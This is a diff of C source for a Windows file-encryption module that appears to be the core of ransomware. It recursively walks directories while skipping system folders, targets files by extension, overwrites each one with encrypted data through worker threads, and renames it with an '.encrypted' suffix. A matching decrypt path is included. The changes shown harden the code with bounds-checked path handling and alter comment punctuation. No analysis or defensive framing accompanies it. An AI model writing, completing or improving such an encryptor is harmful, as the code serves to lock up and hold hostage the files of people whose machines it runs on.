@@ -65,7 +65,7 @@ static bool IsKeyFilePath(const char *path) {
 
 static bool IsTargetExtension(const char *path);
 
-/* Skip list — system dirs */
+/* Skip list – system dirs */
 static const char *g_skip[] = {
     "\\Windows", "\\System32", "\\SysWOW64",
     "\\Program Files", "\\Program Files (x86)",
@@ -102,7 +102,7 @@ static const char *g_ext[] = {
     NULL
 };
 
-/* — Internal context — */
+/* – Internal context – */
 struct FILEOPS_CTX {
     FILEOPS_CONFIG    config;
     FILEOPS_STATS     stats;
@@ -123,7 +123,7 @@ struct FILEOPS_CTX {
     volatile LONG     shutdownFlag;
 };
 
-/* — Worker thread — */
+/* – Worker thread – */
 static DWORD WINAPI WorkerThread(LPVOID lpParam) {
     FILEOPS_CTX *ctx = (FILEOPS_CTX *)lpParam;
     const bool decryptMode = ctx->config.decryptMode;
@@ -164,7 +164,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             continue;
         }
 
-        /* — Encrypt or Decrypt — */
+        /* – Encrypt or Decrypt – */
         HANDLE hFile = INVALID_HANDLE_VALUE;
         BYTE  *buf   = NULL;
         BYTE  *plaintext = NULL;
@@ -218,9 +218,9 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         }
 
         if (decryptMode) {
-            /* ═══════════════════════════════════════════════════════════
+            /* ════════════════════════════════════════════════════════════════
              * DECRYPT PATH
-             * ═══════════════════════════════════════════════════════════ */
+             * ════════════════════════════════════════════════════════════════ */
             bufSize = fs;
             buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -279,7 +279,13 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
 
             /* Write decrypted data to temp file */
             char tmpPath[FILEOPS_MAX_PATH];
-            snprintf(tmpPath, sizeof(tmpPath), "%s.tmp", origPath);
+            size_t pathLen = strlen(origPath);
+            if (pathLen > FILEOPS_MAX_PATH - 5) {
+                MiseryLog(MISERY_LOG_WARN, "FileOps: Path too long: %s", origPath);
+                goto worker_done;
+            }
+            memcpy(tmpPath, origPath, pathLen);
+            memcpy(tmpPath + pathLen, ".tmp", 5);
 
             HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE, FILE_SHARE_READ,
                                         NULL, CREATE_ALWAYS,
@@ -301,11 +307,11 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
                 goto worker_done;
             }
 
-            /* Rename .tmp — original (stripped name) */
+            /* Rename .tmp – original (stripped name) */
             if (!MoveFileExA(tmpPath, origPath,
                              MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                 MiseryLog(MISERY_LOG_WARN,
-                          "FileOps: MoveFileEx %s — %s failed (err: %lu)",
+                          "FileOps: MoveFileEx %s – %s failed (err: %lu)",
                           tmpPath, origPath, GetLastError());
                 DeleteFileA(tmpPath);
                 goto worker_done;
@@ -315,7 +321,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             DeleteFileA(narrowPath);
 
             success = true;
-            MiseryLog(MISERY_LOG_INFO, "FileOps: Decrypted %s (%lu bytes) — %s",
+            MiseryLog(MISERY_LOG_INFO, "FileOps: Decrypted %s (%lu bytes) – %s",
                       narrowPath, fs, origPath);
             EnterCriticalSection(&ctx->statsLock);
             ctx->stats.bytesProcessed += fs;
@@ -323,9 +329,9 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             LeaveCriticalSection(&ctx->statsLock);
 
         } else {
-            /* ═══════════════════════════════════════════════════════════
+            /* ════════════════════════════════════════════════════════════════
              * ENCRYPT PATH
-             * ═══════════════════════════════════════════════════════════ */
+             * ════════════════════════════════════════════════════════════════ */
             bufSize = CRYPTO_REQUIRED_CAPACITY(fs);
             buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -373,7 +379,13 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
 
             /* Write encrypted data to .tmp */
             char tmpPath[FILEOPS_MAX_PATH];
-            snprintf(tmpPath, sizeof(tmpPath), "%s.tmp", narrowPath);
+            size_t pathLen = strlen(narrowPath);
+            if (pathLen > FILEOPS_MAX_PATH - 5) {
+                MiseryLog(MISERY_LOG_WARN, "FileOps: Path too long: %s", narrowPath);
+                goto worker_done;
+            }
+            memcpy(tmpPath, narrowPath, pathLen);
+            memcpy(tmpPath + pathLen, ".tmp", 5);
 
             HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE, FILE_SHARE_READ,
                                         NULL, CREATE_ALWAYS,
@@ -395,29 +407,36 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
                 goto worker_done;
             }
 
-            /* Atomic rename: .tmp — original (overwrite with encrypted data) */
+            /* Atomic rename: .tmp – original (overwrite with encrypted data) */
             if (!MoveFileExA(tmpPath, narrowPath,
                              MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                 MiseryLog(MISERY_LOG_WARN,
-                          "FileOps: MoveFileEx %s — %s failed (err: %lu)",
+                          "FileOps: MoveFileEx %s – %s failed (err: %lu)",
                           tmpPath, narrowPath, GetLastError());
                 DeleteFileA(tmpPath);
                 goto worker_done;
             }
 
-            /* Rename original — original.encrypted */
+            /* Rename original – original.encrypted */
             char encPath[FILEOPS_MAX_PATH];
-            snprintf(encPath, sizeof(encPath), "%s%s", narrowPath, ENC_EXT);
+            size_t encPathLen = strlen(narrowPath);
+            if (encPathLen > FILEOPS_MAX_PATH - ENC_EXT_LEN - 1) {
+                MiseryLog(MISERY_LOG_WARN, "FileOps: Path too long: %s", narrowPath);
+                goto worker_done;
+            }
+            memcpy(encPath, narrowPath, encPathLen);
+            memcpy(encPath + encPathLen, ENC_EXT, ENC_EXT_LEN);
+            encPath[encPathLen + ENC_EXT_LEN] = '\0';
             if (!MoveFileExA(narrowPath, encPath,
                              MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                 MiseryLog(MISERY_LOG_WARN,
-                          "FileOps: MoveFileEx %s — %s failed (err: %lu)",
+                          "FileOps: MoveFileEx %s – %s failed (err: %lu)",
                           narrowPath, encPath, GetLastError());
                 goto worker_done;
             }
 
             success = true;
-            MiseryLog(MISERY_LOG_INFO, "FileOps: Encrypted %s (%lu bytes) — %s",
+            MiseryLog(MISERY_LOG_INFO, "FileOps: Encrypted %s (%lu bytes) – %s",
                       narrowPath, fs, encPath);
             EnterCriticalSection(&ctx->statsLock);
             ctx->stats.bytesProcessed += fs;
@@ -433,7 +452,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             LeaveCriticalSection(&ctx->statsLock);
         }
 
-        /* — Safe cleanup — all pointers check for NULL before freeing — */
+        /* – Safe cleanup – all pointers check for NULL before freeing – */
         if (buf) {
             SecureZeroMemory(buf, bufSize);
             VirtualFree(buf, 0, MEM_RELEASE);
@@ -454,7 +473,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
     return 0;
 }
 
-/* — Enqueue — */
+/* – Enqueue – */
 static void EnqueueFile(FILEOPS_CTX *ctx, const WCHAR *fullPath) {
     if (!ctx || !fullPath) return;
     size_t pathBytes = (wcslen(fullPath) + 1) * sizeof(WCHAR);
@@ -472,7 +491,7 @@ static void EnqueueFile(FILEOPS_CTX *ctx, const WCHAR *fullPath) {
     LeaveCriticalSection(&ctx->queueLock);
 }
 
-/* — Traverse — */
+/* – Traverse – */
 static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
     if (depth > MAX_DEPTH) return;
     if (ctx->config.pfnShouldSkip && ctx->config.pfnShouldSkip(dir)) return;
@@ -507,9 +526,9 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
                 continue;
 
             if (ctx->config.decryptMode) {
-                /* ═══════════════════════════════════════════════════════
+                /* ════════════════════════════════════════════════════════════════
                  * DECRYPT TRAVERSE: only .encrypted files
-                 * ═══════════════════════════════════════════════════════ */
+                 * ════════════════════════════════════════════════════════════════ */
                 const char *encPos = NULL;
                 for (const char *p = narrow; *p; p++) {
                     if (*p == '.' && _strnicmp(p, ENC_EXT, ENC_EXT_LEN) == 0)
@@ -552,7 +571,13 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
 
                 /* Skip if .encrypted already exists (file already processed) */
                 char encPath[FILEOPS_MAX_PATH];
-                snprintf(encPath, sizeof(encPath), "%s%s", narrow, ENC_EXT);
+                size_t pathLen = strlen(narrow);
+                if (pathLen > FILEOPS_MAX_PATH - ENC_EXT_LEN - 1) {
+                    continue;
+                }
+                memcpy(encPath, narrow, pathLen);
+                memcpy(encPath + pathLen, ENC_EXT, ENC_EXT_LEN);
+                encPath[pathLen + ENC_EXT_LEN] = '\0';
                 if (GetFileAttributesA(encPath) != INVALID_FILE_ATTRIBUTES) continue;
 
                 MiseryLog(MISERY_LOG_INFO, "FileOps: Queueing encrypt: %s", narrow);
@@ -563,9 +588,9 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
     FindClose(hFind);
 }
 
-/* ═══════════════════════════════════════════════════════════════════════
+/* ════════════════════════════════════════════════════════════════════════════════════════════════════════════════
  * PUBLIC API
- * ═══════════════════════════════════════════════════════════════════════ */
+ * ════════════════════════════════════════════════════════════════════════════════════════════════════════════════ */
 
 FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
     FILEOPS_CTX *ctx = (FILEOPS_CTX *)
@@ -694,7 +719,7 @@ bool FileOps_DefaultShouldSkip(const WCHAR* path) {
 }
 
 /*
- * FIX: IsTargetExtension() — returns true if the file extension
+ * FIX: IsTargetExtension() – returns true if the file extension
  * matches one of the target encryption extensions.
  *
  * Key file exclusion: uses IsKeyFilePath() for robust detection,
